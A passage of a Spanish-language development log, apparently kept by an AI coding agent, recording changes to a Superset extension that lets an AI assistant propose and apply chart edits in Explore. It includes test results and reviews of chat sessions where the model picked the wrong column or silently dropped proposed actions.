  inválido, el POST de siembra falla) se trata igual que antes: `formData`
  queda `undefined`, mismo mensaje de error de siempre — no hay forma
  nueva de fallar, solo un caso más que ahora SÍ puede tener éxito.

Verificación:
- `npx tsc --noEmit`: limpio.
- `npx jest`: 298/298 (22 suites) — 1 test nuevo de `postAppliedFormData`
  (manda/no manda `tab_id` según corresponda) + 7 tests nuevos de
  `readExploreContext` (siembra exitosa + URL actualizada, `tab_id` de
  `sessionStorage`, gráfico guardado inexistente, datasource inválido,
  POST de siembra fallido, sin `slice_id` no intenta nada, con
  `form_data_key` ya resuelto no intenta sembrar).
- `./scripts/build-extension.sh .../superset_v6_1_0 .../extensions_test/irex-mcp-tools-0.1.0.supx`:
  7/7 — sin cambios de Python (298 backend sin tocar).
- Pendiente (para el usuario): reiniciar `superset_test.service` y repetir
  el caso real — abrir el `slice_id: 157` (u otro gráfico guardado recién
  abierto, sin tocar ningún control) y usar "Explicar"/"Mejorar gráfico"
  directamente.

### 2026-09-25 (89) (Explore: rediseño de "Aplicar todo" a un único casillero + formato legible en `column_config`)

Cambio realizado: a pedido explícito del usuario, sobre lo construido en la
entrada 88: "Puedes pensar mejor esa parte, tanto en UX como en la forma
que se aplica, la siento compleja, además indicar que si se aplica solo 1
las demás se borran no me parece bien." Además: "otro tema es que también
debería actuar sobre la personalización (aplica formatos etc.)" —
verificado contra una sesión real
(`explore-e25678070e7c8a06124b9717b299c448acd7da1aea2df1cf3acd95c183fbc49f`)
que sí aplicaba un formato (`column_config`/`d3NumberFormat`) vía
`patch_form_data`: la propuesta era estructuralmente válida, pero el diff
la mostraría como JSON crudo (el mismo problema de legibilidad de la
entrada 85, sin resolver para este control en particular).

Archivos afectados:
- `custom-extensions/irex-mcp-tools/frontend/src/adapters/exploreApplyAdapter.ts` (`formatControlDiffValue`, nuevo, exportado)
- `custom-extensions/irex-mcp-tools/frontend/src/__tests__/exploreApplyAdapter.test.ts` (+7 tests)
- `custom-extensions/irex-mcp-tools/frontend/src/assistant/ExploreAssistantPanel.tsx` (`ExploreApplyAllBar` reemplazada por `ExploreProposalChecklist`; `ExploreActionCard` pierde el aviso de "hermanas"; `ControlDiffRow` usa el formateo nuevo)
- `custom-extensions/irex-mcp-tools/frontend/src/__tests__/ExploreAssistantPanel.test.tsx` (describe reescrito)

Qué cambia (UX — punto 1 del pedido):
- Se elimina la barra "Aplicar todo" separada de las tarjetas individuales
  (dos componentes, un aviso repetido por tarjeta) — reemplazada por UNA
  sola tarjeta con casilleros (`ExploreProposalChecklist`), todos tildados
  por defecto, cuando la propuesta trae 2+ acciones aplicables. Con 0 o 1,
  sigue siendo la tarjeta simple de siempre — sin casillero de un solo
  elemento, que no aportaría nada.
- Desaparece por completo el aviso "si aplicás esta sola, las demás se
  pierden": ya no tiene sentido, porque lo que el usuario NO tilda nunca
  estuvo en el paquete a aplicar — no hay "efecto secundario" que avisar,
  solo una elección explícita. Mientras hay un diff en pantalla los
  casilleros se bloquean (hay que "Cancelar" para volver a elegir) — evita
  mostrar un diff que ya no corresponde a la selección.
- "Ver cambio" queda deshabilitado si no hay nada tildado — nunca se puede
  llegar a aplicar un paquete vacío.
- El flujo de aplicar en sí (`usePreparedApply`, revalidar la key dos
  veces, `window.confirm`, POST sin `tab_id`, `Deshacer` con conversación)
  no cambió — es exactamente el mismo mecanismo de la entrada 88 y 84,
  ahora alimentado por la selección de casilleros en vez de "todas las
  acciones aplicables".

Qué cambia (formato legible — punto 2 del pedido):
- `formatControlDiffValue(control, value)`: igual que `formatControlValue`
  para cualquier control, PERO especializa `column_config` — su forma real
  es un MAPA `{"nombre de columna": {ajustes}}`, no un único
  `AdhocMetric`/`AdhocColumn`, así que `formatControlValue` solo caía al
  JSON del mapa entero. Ahora cada entrada se resume ("Cuota: formato
  numérico \",d\"") reconociendo `d3NumberFormat`, `d3SmallNumberFormat`,
  `currency.symbol` y `displayName` — los mismos campos reales de
  `TableColumnConfig` (verificado leyendo
  `plugin-chart-tableV3/src/types.ts` y `transformProps.ts`, que además
  confirmó que `column_config` se indexa por el LABEL del metric/columna,
  no por un id interno — la propuesta real de la sesión revisada usaba
  exactamente esa convención, correctamente).

Verificación:
- `npx tsc --noEmit`: limpio.
- `npx jest`: 290/290 (22 suites) — 7 tests nuevos de
  `formatControlDiffValue` (mapa con `d3NumberFormat`, varios ajustes
  combinados, moneda, ajuste desconocido cae a JSON de esa columna no del
  mapa entero, undefined/vacío, otros controles sin cambios, valor mal
  formado) + describe reescrito de la lista con casilleros en
  `ExploreAssistantPanel.test.tsx` (1 acción → sin casillero; 2+ → todo
  tildado por defecto y SIN el aviso viejo; destildar todo deshabilita
  "Ver cambio"; misma comprobación de key que antes).
- `./scripts/build-extension.sh .../superset_v6_1_0 .../extensions_test/irex-mcp-tools-0.1.0.supx`:
  7/7 — sin cambios de Python en esta entrada (298 backend sin tocar).
- Pendiente (para el usuario): reiniciar `superset_test.service` y probar
  el casillero nuevo sobre una propuesta real de varios cambios, y el
  formato legible sobre una propuesta de `column_config`.

Nota aparte, reportada para el agente del backend del chat (sin cambio de
código de este lado — es responsabilidad del modelo, no de la extensión):
en la MISMA sesión revisada
(`explore-e25678070e7c8a06124b9717b299c448acd7da1aea2df1cf3acd95c183fbc49f`),
el turno que propuso el `column_config` de formato no tiene NINGUNA
llamada a herramienta (`tool_call`) — el modelo propuso el cambio de
control sin llamar `irex.get_viz_controls` para confirmar que
`column_config` era un control real de `table_v3`. En este caso
particular el control y el campo (`d3NumberFormat`) eran correctos
(verificado leyendo el código fuente del plugin), pero fue por acierto del
modelo, no por verificación — exactamente el caso que el contrato ya
advierte ("sin validar el nombre del control contra esto, no confiar en
la propuesta").

### 2026-09-25 (88) (Explore: "Aplicar todo" — combinar varias acciones de una misma propuesta en un solo paso)

Cambio realizado: a pedido explícito del usuario, con captura
(`explore-bb7d5ba72e84e1d5e4f891614edb93d0461082754114b4372df7fa4b2c9e943`):
una propuesta de "Mejorar gráfico" trajo 4 acciones relacionadas (agrupar
por segmento/familia/marca + 3 métricas) que solo tenían sentido juntas
para el resultado que el usuario pedía, pero cada una necesitaba su propio
"Ver cambio"/"Aplicar" — y aplicar la primera recargaba la página
(mecanismo de la Fase 6) y hacía desaparecer las otras 3 tarjetas, sin
forma de retomarlas. Palabras del usuario: "no creo que sea adecuado
tener que aplicar uno a uno […] lo importante es ver si se puede aplicar
todo en 1 paso en estos casos".

Archivos afectados:
- `custom-extensions/irex-mcp-tools/frontend/src/adapters/exploreApplyAdapter.ts` (`applyExploreActions`, nuevo, exportado)
- `custom-extensions/irex-mcp-tools/frontend/src/__tests__/exploreApplyAdapter.test.ts` (+3 tests)
- `custom-extensions/irex-mcp-tools/frontend/src/assistant/ExploreAssistantPanel.tsx` (`usePreparedApply` extraído; `ExploreApplyAllBar` nuevo; `ExploreActionCard` avisa cuando hay hermanas)
- `custom-extensions/irex-mcp-tools/frontend/src/__tests__/ExploreAssistantPanel.test.tsx` (+3 tests)

Qué cambia:
- `applyExploreActions(formData, actions[])` encadena varias acciones de
  la MISMA propuesta en orden (mismo mecanismo que ya usan las
  `operations` de un solo `patch_form_data`) — cada acción ve el resultado
  acumulado de las anteriores, así que 3 `add_adhoc_metric` sobre el mismo
  control (`metrics`) se van agregando una tras otra, no se pisan.
- El flujo prepare→diff→confirm→POST/reload que antes vivía solo dentro
  de `ExploreActionCard` se extrajo a un hook compartido
  (`usePreparedApply`) — la única diferencia entre aplicar UNA acción y
  aplicar VARIAS es cuántas entran al `reduce`; todo lo demás (revalidar
  la key vigente dos veces, el diff, el `window.confirm`, el POST sin
  `tab_id`, guardar el `PendingExploreUndo` con la conversación, el
  reload) es exactamente el mismo código, ahora sin duplicar.
- `ExploreApplyAllBar`, nuevo: aparece SOLO cuando la respuesta trae 2 o
  más acciones aplicables (Nivel 2), como una tarjeta más arriba de la
  lista, con "Ver todos los cambios"/"Aplicar todo (N)" — el diff que
  muestra es el COMBINADO (antes = form_data actual, después = form_data
  con las N acciones ya encadenadas), no N diffs separados.
- Las tarjetas individuales se mantienen (cherry-picking sigue siendo
  posible: alguien puede querer solo 1 de las N) pero ahora, cuando hay
  hermanas, muestran un aviso explícito: "Aplicar esta tarjeta sola
  también recarga la página — las demás propuestas de este turno dejan de
  estar disponibles. Para aplicarlas juntas, usá 'Aplicar todo' arriba."
- El "Deshacer" de un "Aplicar todo" sigue siendo UN solo nivel (como ya
  era): vuelve a la key de antes de las N acciones, no a una por una.

Verificación:
- `npx tsc --noEmit`: limpio.
- `npx jest`: 282/282 (22 suites) — 3 tests nuevos de `applyExploreActions`
  (encadenado en orden, sin acciones, no muta el original) + 3 tests
  nuevos de panel (sin barra con 1 sola acción; aparece con 2+ y cada
  tarjeta avisa; "Ver todos los cambios" respeta la misma comprobación de
  key vigente que una tarjeta individual).
- `./scripts/build-extension.sh .../superset_v6_1_0 .../extensions_test/irex-mcp-tools-0.1.0.supx`:
  7/7 — sin cambios de Python en esta entrada (298 backend sin tocar).
- Pendiente (para el usuario): reiniciar `superset_test.service` y probar
  "Aplicar todo" sobre una propuesta real de varios cambios.

### 2026-09-25 (87) (Explore: `irex.get_dataset_catalog` — nueva tool, catálogo verificado de columnas/métricas)

Cambio realizado: a pedido explícito del agente del backend del chat
(reportado por el usuario), que diagnosticó con precisión el hueco:
`irex.get_explore_state` da el estado del gráfico pero no el catálogo de
columnas del dataset, y `irex.validate_expression` solo confirma una
expresión A LA VEZ — sin catálogo, el modelo le pregunta al usuario por
columnas que ya existen (sesión `explore-2287e800...`, dataset 5, el
usuario ya había mencionado "cuota" y "sell_in" y el modelo preguntó de
nuevo por "cuota"). Implementada `irex.get_dataset_catalog`.

Archivos afectados:
- `custom-extensions/irex-mcp-tools/backend/src/irex/irex_mcp_tools/explore_dataset_catalog_core.py` (nuevo)
- `custom-extensions/irex-mcp-tools/backend/src/irex/irex_mcp_tools/get_dataset_catalog.py` (nuevo)
- `custom-extensions/irex-mcp-tools/backend/tests/test_explore_dataset_catalog_core.py` (nuevo, 13 tests)
- `custom-extensions/irex-mcp-tools/backend/src/irex/irex_mcp_tools/entrypoint.py`
- `custom-extensions/irex-mcp-tools/docs/explore-assistant-contract.md`
- `superset_config_test.py` (paso 6 OBLIGATORIO de CLAUDE.md: agregado a `always_visible`)

Qué hace:
- Input `{"form_data_key": "key-1"}` — la MISMA key que `get_explore_state`,
  a propósito: reusa `verified_explore_state` SIN modificarla, así que el
  catálogo queda atado al datasource del estado YA verificado (mismos
  permisos/acceso, mismo comportamiento con gráfico sin guardar
  `slice_id: null`, mismos errores de key vencida/dataset inválido) — no
  hay forma de pedir el catálogo de un dataset arbitrario sin pasar por
  esa verificación, ni nombres/IDs fijos.
- Carga `dataset.columns`/`dataset.metrics` del `SqlaTable` real
  (`DatasetDAO.find_by_id`, mismo patrón que `validate_expression.py`) —
  el acceso al dataset ya lo verificó `check_access` de
  `verified_explore_state` (`superset.explore.utils.check_access` →
  `check_datasource_access`, el mismo camino real que usa Explore), así
  que no hay una segunda comprobación de permisos redundante.
- Devuelve `columns[]` (nombre real, tipo, `label`/`description` cuando el
  dataset los tiene, `is_calculated`+`expression` si es una columna
  virtual, `is_temporal` si es la columna de fecha) y `metrics[]` (SOLO
  las métricas GUARDADAS del dataset, siempre con su `expression` SQL
  real) — nunca filas, nunca prueba de ejecución: `state_kind` sigue
  siendo `"last_persisted"`, igual que `get_explore_state`.
- Columnas inactivas (`is_active=False`) se excluyen — no son seleccionables
  en Explore, no tiene sentido ofrecerlas.
- Límite generoso (300 columnas / 200 métricas) con `truncated: true`
  explícito si se llega al tope — nunca se recorta en silencio, tal como
  pidió el backend.

Verificación:
- `PYTHONPATH=src pytest tests/test_explore_dataset_catalog_core.py`:
  13/13 — reducción de columna/métrica (mínima, con label/descripción,
  calculada, temporal), orden por nombre, sin truncar / truncando columnas
  / truncando métricas. Los casos de permisos, key/dataset inválido y
  gráfico sin guardar NO se duplican: ya están cubiertos por
  `test_explore_state_core.py`, y esta tool reusa esa función sin tocarla.
- `py_compile` OK sobre los 3 archivos backend tocados/nuevos.
- `./scripts/build-extension.sh .../superset_v6_1_0 .../extensions_test/irex-mcp-tools-0.1.0.supx`:
  7/7 — 298 tests backend (13 nuevos), frontend sin cambios, `.supx`
  reconstruido y validado.
- Pendiente: reiniciar `superset_test.service`/`superset_mcp_test.service`
  y avisarle al agente del backend del chat (contrato + ejemplo de
  respuesta ya en `docs/explore-assistant-contract.md`) para que lo
  conecte del lado del modelo.

### 2026-09-25 (86) (Explore: aclaraciones en texto plano en vez de estructuradas — confirmado 100% backend/prompt, sin cambio de código de este lado; segunda acción descartada en silencio)

Cambio realizado: ninguno de código — revisión de una sesión real a pedido
del usuario (`explore-9155a2b633a9a5d746ca256eaed479032a4411606ec2386c8ffb011d6a6c2da7`,
captura adjunta), que pidió "corregirlo para que funcione como en el
SQLLab" al ver que la pregunta de aclaración del modelo se mostraba como
texto plano dentro del mensaje (con un diagnóstico "info" al lado) en vez
de como el widget de botones seleccionables que ya usa SQL Lab.

Hallazgo (turno 1 de la sesión): el modelo escribió la pregunta
("¿qué columna representa exactamente la venta sell_in? Y, ¿quieres
calcular (sell_in − cuota)/cuota o (cuota − sell_in)/cuota?") como texto
libre en `message`, con `clarification_questions: []` y sin
`suggestion_kind` en el sobre. **Confirmado que esto NO es un bug del
lado de la extensión:** `Clarification.tsx` es el MISMO componente que usa
SQL Lab (no hay una versión separada para Explore) — ya sabe renderizar
preguntas con opciones como botones, ya está conectado en
`ExploreAssistantPanel.tsx` desde la entrada 70, y ya tiene tests. El
parser del contrato (`exploreAssistant.ts::parseExploreAssistantResponse`)
además es estricto a propósito: si `suggestion_kind !== "clarification"`,
`clarification_questions` se descarta aunque venga con datos (línea
163-176) — no hay forma de que el frontend "adivine" que un mensaje de
texto es en realidad una aclaración. El fix completo depende de que el
backend del chat, en modo Explore, instruya al modelo a devolver
`suggestion_kind: "clarification"` + `clarification_questions: [{id, text,
options[]}, ...]` en vez de la pregunta en prosa — lo mismo que ya hace
(se asume) para SQL Lab. Coincide con la nota lateral ya anotada en la
entrada 80 (el modelo a veces cae a texto plano al pedir aclaración) —
esta sesión da un ejemplo concreto y reproducible para el otro agente.

**Segundo hallazgo, no pedido pero relevante (turno 2 de la misma
sesión):** reaparece el patrón de la entrada 82 (acción descartada en
silencio, `message` cae al fallback genérico) — esta vez con
`add_adhoc_metric` en vez de `patch_form_data`. El modelo llamó a
`irex.validate_expression` y armó una acción bien formada
(`100.0 * SUM(sell_in) / NULLIF(SUM(planv), 0)`, visible en
`agent_done.answer`), pero `done.explore_response` llegó con
`message: "No pude generar una propuesta estructurada y verificable.
Intenta de nuevo."` y `actions: []`. La entrada 83 había confirmado
cerrado este hallazgo para `patch_form_data` — esta sesión sugiere que el
fix del backend no cubrió (o no cubre de la misma forma) `add_adhoc_metric`.

**Tercer hallazgo (2026-09-25, corrección tras revisión del usuario) — más
grave que el anterior: la expresión de esa misma acción usa la columna
EQUIVOCADA.** El usuario pidió una métrica sobre "cuota" vs. `sell_in`; el
`message` del modelo dice textualmente "100 × venta / **cuota**", pero la
`expression` que arma es `100.0 * SUM(sell_in) / NULLIF(SUM(**planv**), 0)`
— divide por `planv`, no por `cuota`. No son sinónimos: la sesión anterior
del mismo día (`explore-50596f8...`, entradas 84/85) existió justamente
para REEMPLAZAR `SUM(planv)` por `SUM(cuota)` como métrica del gráfico —
son dos columnas distintas. El propio modelo, en la pregunta de aclaración
de este turno, ya trataba "cuota" como un concepto entendido (solo
preguntó por `sell_in` y por el signo, nunca por qué es "cuota"). Esto es
un error de fondo del modelo al armar la expresión a partir del pedido —
no algo que el MCP pueda detectar: `irex.validate_expression` solo
confirma que `SUM(planv)` es SQL válido contra el dataset 5, no tiene
forma de saber que el usuario pidió "cuota". **Más serio que el hallazgo
2:** si esta acción NO se hubiera descartado, se le habría propuesto al
usuario aplicar la fórmula equivocada mientras el texto le aseguraba que
era la correcta — el descarte en silencio, aunque es un bug aparte, en
este caso concreto evitó un error peor.

Verificación: ninguna adicional — ambos hallazgos son de solo lectura del
log real vía el endpoint documentado en CLAUDE.md. Sin cambios de código
en esta entrada.

### 2026-09-25 (85) (Explore: feedback de la primera prueba real de Fase 6 — diff legible y conversación que sobrevive al reload)

Cambio realizado: el usuario probó "Aplicar" por primera vez (sesión
`explore-50596f802aea7d1a7c567ba8436557e4e1692d64a129666f89d629043a586318`,
capturas adjuntas) — funcionó de punta a punta (confirmado releyendo el
log: `agent_done`/`done.explore_response` coinciden, la métrica se aplicó y
el aviso de "Deshacer" apareció) — con dos observaciones de UX, ninguna un
bug:
1. "El cuadro donde se muestra que cambia es muy técnico, muy confuso un
   json no es cómodo de leer."
2. "Al aplicar se recarga la página, veo el deshacer, pero la conversación
   se pierde. ¿Es posible hacer el cambio sin recargar la página?"

Archivos afectados:
- `custom-extensions/irex-mcp-tools/frontend/src/adapters/exploreApplyAdapter.ts` (`formatControlValue`, nuevo, exportado)
- `custom-extensions/irex-mcp-tools/frontend/src/__tests__/exploreApplyAdapter.test.ts` (+11 tests)
- `custom-extensions/irex-mcp-tools/frontend/src/assistant/ExploreAssistantPanel.tsx` (`ControlDiffRow` usa `formatControlValue`; conversación restaurable al montar)
- `custom-extensions/irex-mcp-tools/frontend/src/hosts/exploreUndo.ts` (`PendingExploreUndo.conversation`, opcional)
- `custom-extensions/irex-mcp-tools/frontend/src/__tests__/exploreUndo.test.ts` (+2 tests)
- `custom-extensions/irex-mcp-tools/frontend/src/__tests__/ExploreAssistantPanel.test.tsx` (+2 tests de restauración)

Qué cambia o corrige:
- **Punto 1 (diff legible):** `formatControlValue` reconoce las formas
  reales de `AdhocMetric`/`AdhocColumn` de Superset en vez de volcar el
  objeto entero — el caso exacto de la captura
  (`{"aggregate":"SUM","column":{...columna completa...}}`) ahora se
  muestra como `SUM(planv)`; una métrica SQL con label propio muestra el
  label (`Cuota`), sin label la expresión (`SUM(cuota)`); un array de
  métricas se lista separado por comas. Solo lo que no calza con ninguna
  forma conocida cae a JSON acotado, como antes.
- **Punto 2 (recarga completa):** confirmado que **no hay forma de
  evitarla** con la API pública de extensiones de este Superset —
  `@apache-superset/core` no expone ningún hook hacia el store de Redux ni
  el árbol de React de Explore (revisado el `.d.ts` completo: `views`,
  `commands`, `menus`, `theme`, `extensions`, nada de eso da acceso al
  estado interno; `views.registerView` no pasa props al provider). Tocar
  el store real de Explore requeriría importar `superset-frontend/src/
  explore/...` directamente — exactamente lo que CLAUDE.md prohíbe. Es un
  límite estructural de esta versión de Superset, no una tarea pendiente.
  Documentado explícitamente en el plan para no reabrirlo sin una API
  nueva de Superset.
- Lo que SÍ se resolvió, que era el dolor real detrás de la pregunta: la
  conversación ya no se pierde. `exploreUndo.ts` guarda ahora, junto con
  la key para deshacer, una instantánea de la conversación
  (`conversationKey`, `sessionId`, `mode`, `history`) tomada justo al
  confirmar "Aplicar". Al volver a montar el panel tras el reload, si el
  aviso de "Deshacer" sigue vigente (mismo gráfico, misma key recién
  aplicada), la conversación se restaura completa; en cualquier otro caso
  arranca vacía como siempre. Mismo ciclo de vida que "Deshacer" a
  propósito: cuando deja de tener sentido ofrecer deshacer, tampoco tiene
  sentido seguir mostrando esa conversación como "la actual".
- Compatibilidad hacia atrás: `conversation` es opcional — una entrada
  vieja en `sessionStorage` (de antes de esta entrada) se sigue leyendo
  sin el campo, sin romper.

Verificación:
- `npx tsc --noEmit`: limpio.
- `npx jest`: 276/276 (22 suites) — 13 tests nuevos (11 de
  `formatControlValue` cubriendo el caso exacto de la captura del usuario,
  2 de round-trip de `conversation` en `exploreUndo.test.ts`) + 2 tests
  nuevos de restauración end-to-end en `ExploreAssistantPanel.test.tsx`
  (con conversación y sin ella, compatibilidad hacia atrás).
- `./scripts/build-extension.sh .../superset_v6_1_0 .../extensions_test/irex-mcp-tools-0.1.0.supx`:
  7/7 — sin cambios de Python en esta entrada, 285 backend sin tocar.
- Pendiente (para el usuario): reiniciar `superset_test.service` y repetir
  una propuesta real para confirmar visualmente el diff legible y que la
  conversación reaparece tras aplicar.

### 2026-09-25 (84) (Explore: Fase 6 — aplicar cambios reales al gráfico, con diff y "Deshacer")

Cambio realizado: a pedido explícito del usuario ("Adelante con la fase 6,
queda pendiente la 5, pero primero avanza con la 6"), el panel de Explore
ahora puede escribir de verdad los cambios que propone (Nivel 2 del plan:
cambios al gráfico sin guardar — nunca al dataset, eso sigue siendo Fase 7
y solo Admin). Hasta esta entrada, `ExploreActionCard` (entrada 70) solo
describía la propuesta; el texto de la propia tarjeta decía "Aplicar
propuestas automáticamente todavía no está disponible" (así lo confirmó
la entrada 83 al usuario, que no era un bug).

Archivos afectados:
- `custom-extensions/irex-mcp-tools/frontend/src/adapters/exploreApplyAdapter.ts` (nuevo)
- `custom-extensions/irex-mcp-tools/frontend/src/hosts/exploreUndo.ts` (nuevo)
- `custom-extensions/irex-mcp-tools/frontend/src/__tests__/exploreApplyAdapter.test.ts` (nuevo, 36 tests)
- `custom-extensions/irex-mcp-tools/frontend/src/__tests__/exploreUndo.test.ts` (nuevo, 10 tests)
- `custom-extensions/irex-mcp-tools/frontend/src/adapters/exploreAdapter.ts` (`parseDatasourceRef` extraído a función exportada, reusada por el adapter de lectura y el de aplicar)
- `custom-extensions/irex-mcp-tools/frontend/src/__tests__/exploreAdapter.test.ts` (+7 tests para `parseDatasourceRef`)
- `custom-extensions/irex-mcp-tools/frontend/src/assistant/ExploreAssistantPanel.tsx` (`ExploreActionCard` reescrita con estado propio; nuevo `ExploreUndoBanner`)
- `custom-extensions/irex-mcp-tools/frontend/src/__tests__/ExploreAssistantPanel.test.tsx` (describe "acciones — Fase 6" reemplaza al viejo "de solo lectura"; nuevo describe del aviso de "Deshacer")

Qué cambia o corrige:
- Solo son aplicables desde el panel las 4 acciones de Nivel 2:
  `patch_form_data`, `add_adhoc_metric`, `add_adhoc_column`,
  `change_viz_type` (`isApplicableExploreAction`). Las de dataset
  (`add_dataset_metric`, `add_calculated_column`) y `preview` siguen sin
  botón, con un motivo explícito en la tarjeta ("requiere rol Admin" / "la
  vista previa vive en el propio gráfico").
- "Ver cambio" relee `form_data_key` de la URL AHORA MISMO y la compara
  con `action.base_form_data_key` — si no coincide (el usuario navegó,
  ejecutó otra consulta, o pidió otra propuesta), rechaza con un mensaje
  claro en vez de aplicar sobre un estado que ya no es el que el modelo
  vio. Con la key vigente, relee el `form_data` fresco
  (`GET /api/v1/explore/form_data/<key>`), calcula el resultado puro
  (`applyExploreAction`) y el diff control-por-control
  (`diffFormData`) — si el diff queda vacío (ya se había aplicado), lo
  dice en vez de ofrecer un "Aplicar" que no haría nada.
- "Aplicar" vuelve a comprobar la key justo antes de escribir (ventana
  angosta pero real entre "Ver cambio" y el click), pide confirmación
  (mismo patrón de `window.confirm` que `SqlLabAssistantPanel.tsx`,
  advirtiendo que se pierden ediciones sin ejecutar en pantalla), y
  escribe con `POST /api/v1/explore/form_data`. Sin `tab_id` a propósito:
  leyendo `superset/commands/explore/form_data/create.py` se confirmó que
  darlo REUSA la key existente de la pestaña (vía `contextual_key`) en vez
  de generar una nueva — necesitábamos una key nueva y separada para poder
  volver a la anterior. `url_params` se quita del body antes de mandar
  (mismo criterio que `sanitizeFormData.ts` de Explore).
- Tras aplicar, la página se recarga completa
  (`window.location.assign('/explore/?form_data_key=<nueva>&slice_id=<id>')`)
  — es como el propio Explore aplica cambios de key, no hay forma de
  evitar el reload. Antes de recargar se guarda en `sessionStorage`
  (`exploreUndo.ts`, `rememberPendingUndo`) la key ANTERIOR a aplicar, la
  nueva, el slice_id y una descripción — un solo nivel de deshacer, no una
  pila completa (alcanza para "me equivoqué, volvé").
- `ExploreUndoBanner`, nuevo, en la parte superior del panel: lee la
  entrada pendiente al montar y la muestra solo si el `slice_id` y la
  `form_data_key` ACTUALES coinciden con los que quedaron justo después de
  aplicar (si el usuario ya navegó a otra cosa, no se ofrece deshacer para
  un cambio que ya no es "el último"). "Deshacer" navega de vuelta a la
  key anterior y limpia el pendiente; también se puede descartar el aviso
  sin deshacer.

Verificación:
- `npx tsc --noEmit`: limpio.
- `npx jest`: 262/262 (22 suites) — incluye los 36 tests nuevos de
  `exploreApplyAdapter.test.ts`, los 10 de `exploreUndo.test.ts`, los 7
  nuevos de `parseDatasourceRef`, y el describe reescrito de
  `ExploreActionCard`/`ExploreUndoBanner` en `ExploreAssistantPanel.test.tsx`.
- `./scripts/build-extension.sh .../superset_v6_1_0 .../extensions_test/irex-mcp-tools-0.1.0.supx`:
  las 7 fases completas — tsc estricto, 262 tests frontend, `py_compile`
  (33 archivos), 285 tests backend (sin cambios de este lado, ningún
  archivo Python tocado en esta entrada), webpack producción, `.supx`
  reconstruido desde cero y validado.
- Pendiente (para el usuario): reiniciar `superset_test.service` y
  probar "Aplicar" de punta a punta sobre un gráfico real — en particular
  confirmar que el reload deja el gráfico con el cambio, que "Deshacer"
  vuelve al estado anterior, y que salir de Explore y volver hace
  desaparecer el aviso de "Deshacer" (ya no coincide la key).
- Fase 5 (lectura/diagnóstico más rico: "Explicar" con SQL real,
  duration/rowcount/cache, diagnósticos ligados al SQL generado) sigue
  pendiente, deprioritizada por pedido explícito del usuario en esta misma
  instrucción.

### 2026-09-25 (83) (Explore: confirmado el fix de la entrada 82 — la propuesta ya llega completa; falta Fase 6 para poder aplicarla)

Cambio realizado: ninguno de código — verificación a pedido del usuario
tras el fix del backend del chat, sesión
`explore-c97116e8f77fef12f86cdd134e378dcf554a10b48c3d6485d8d597d246d7d117`
(mismo pedido que la entrada 82: cambiar la métrica de `big_number_total`
a `SUM(cuota)`).

Confirmado: `done.explore_response.actions` llega con la acción
`patch_form_data` completa (`SUM(cuota)`, `control: "metric"`),
consistente con el `message` — el hallazgo de la entrada 82 (acción
descartada en silencio) queda cerrado.

El usuario reportó "no puede aplicar la sugerencia, no hubo forma" —
**comportamiento esperado, no un bug.** El panel (`ExploreActionCard`,
entrada 70) muestra la propuesta pero deliberadamente sin botón
"Aplicar" — el texto de la propia tarjeta ya lo dice ("Aplicar propuestas
automáticamente todavía no está disponible"). Aplicar de verdad
(escribir el cambio en el `form_data` de Explore) es la Fase 6 del plan,
que exige validar catálogo y key vigente INMEDIATAMENTE antes de escribir,
mostrar el diff y pedir confirmación — no construida todavía.

Con esto, el lado de LECTURA y PROPUESTA del copiloto de Explore queda
confirmado funcionando de punta a punta (las 4 tools de la Fase 4 +
acciones estructuradas llegando correctamente). El siguiente hito natural
es la Fase 6 (aplicar cambios), pendiente de que el usuario confirme que
quiere avanzar con eso.

Verificación: ninguna adicional — este hallazgo en sí ES la verificación
pedida. Sin cambios de código en esta entrada.

### 2026-09-25 (82) (Explore: primera acción propuesta por el modelo — validada pero descartada en silencio, mensaje inconsistente)

Cambio realizado: ninguno de código — revisión de una sesión real a pedido
del usuario
(`explore-8a291b4e6f5c0897e3082378022659485258060063e75c1a6e07dca96c207d80`,
"Mejorar gráfico" sobre el `big_number_total` de la entrada 80, pidiendo
cambiar la métrica a `SUM(cuota)`).

Hallazgo: el modelo llamó a `irex.validate_expression` (`dataset_id: 5,
expression: "SUM(cuota)", kind: "metric"`) → `valid: true`, y produjo una
acción `patch_form_data` bien formada (`operations: [{op:"set",
control:"metric", value:{...SUM(cuota)...}}]`). **La acción nunca llegó**:
`done.explore_response.actions` vino vacío (`[]`), pero `message` seguía
describiendo la propuesta como si fuera a aplicarse ("Propongo sustituir
la métrica actual SUM(planv) por SUM(cuota)...") — inconsistencia real
entre lo que el texto promete y lo que el sobre estructurado entrega.

El modelo NO llamó a `irex.get_viz_controls` en este turno, solo
`validate_expression` — hipótesis sin confirmar: si el backend exige
ambas validaciones (expresión Y nombre de control) antes de aceptar un
`patch_form_data`, la ausencia de la segunda explicaría el descarte
silencioso. Reportado al usuario con texto para el agente del backend del
chat: confirmar la causa real, y si es esa, ajustar el prompt para exigir
`get_viz_controls` siempre antes de un `patch_form_data`/`change_viz_type`
— y en cualquier caso, no dejar que `message` describa una acción que el
sobre no entrega.

Verificación: ninguna adicional — este hallazgo en sí ES la verificación
pedida. Sin cambios de código en esta entrada. Se pausa el resto del
roadmap (Fase 5+) hasta cerrar este hallazgo, por tocar directamente lo
recién construido (entrada 80).

### 2026-09-25 (81) (Explore: `irex.validate_expression` confirmada por el backend del chat; encontró y corrigió un bug propio relacionado)

Cambio realizado: ninguno de código de este lado — respuesta del agente
del backend del chat a la entrada 80.

Confirmaciones y hallazgo del backend del chat:
- Probó `irex.validate_expression` contra el MCP de test directamente: una
  expresión inocua devolvió `valid: true`; una columna inexistente devolvió
  `valid: false` con `error`, sin filas — confirma que la tool se comporta
  como está documentada en `docs/explore-assistant-contract.md`.
- **Bug propio encontrado y corregido (su lado, no el MCP):** su
  validación asociaba el resultado solo a `(dataset_id, expression)`, sin
  `kind` — validar una MÉTRICA con un texto habilitaba, por error, una
  COLUMNA con el mismo texto. Corregido en
  `api/routes/explore_assistant.py` de su repo, con su contrato y sus
  tests actualizados (83 tests + 9 subtests de Explore y SQL Lab, todos
  verdes de su lado).
- Coincide con la nota de UX que dejamos sobre la sesión "cuota" (entrada
  80, memoria): el sobre de Explore ya admite `clarification_questions`
  estructuradas, pero el prompt del modelo no le indica cómo producirlas
  — confirmado como una mejora real, no corregida en esta revisión.
- Su backend LOCAL no se reinició en esta revisión (probó contra el MCP de
  test desplegado, no volvió a correr los 285 tests de este proyecto). SQL
  y resultados siguen sujetos a la verificación independiente del
  `query_context` — sin cambios respecto a la entrada 79.

Verificación: ninguna adicional de este lado — es la confirmación pedida.
Sin cambios de código en esta entrada.

### 2026-09-25 (80) (Explore: `irex.validate_expression` — última tool pendiente de la Fase 4, encontrada la falta en vivo)

